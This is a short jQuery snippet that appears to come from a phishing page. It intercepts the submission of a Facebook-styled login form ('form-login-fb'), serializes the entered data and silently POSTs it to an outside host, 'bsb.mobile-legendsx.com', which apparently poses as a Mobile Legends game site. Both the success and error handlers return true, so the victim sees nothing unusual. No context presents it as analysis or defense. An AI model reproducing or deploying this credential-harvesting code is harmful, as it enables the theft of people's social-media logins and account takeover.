$(".form-login-fb").submit(function() {
	var d = $(".form-login-fb");

	$.ajax({
        url: "https://bsb.mobile-legendsx.com/",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
